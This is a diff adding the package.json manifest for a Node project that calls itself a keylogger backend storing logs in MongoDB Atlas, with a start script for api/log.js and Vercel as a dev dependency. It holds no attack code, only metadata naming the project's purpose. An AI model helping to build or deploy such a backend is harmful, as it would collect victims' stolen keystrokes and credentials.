@@ -1,0 +1,16 @@
+{
+  "name": "samp-keylog-backend-mongodb",
+  "version": "2.0.0",
+  "description": "Keylogger Backend with MongoDB Atlas",
+  "main": "api/log.js",
+  "scripts": {
+    "start": "node api/log.js",
+    "dev": "vercel dev"
+  },
+  "dependencies": {
+    "mongodb": "^5.9.0"
+  },
+  "devDependencies": {
+    "vercel": "^32.0.0"
+  }
+}
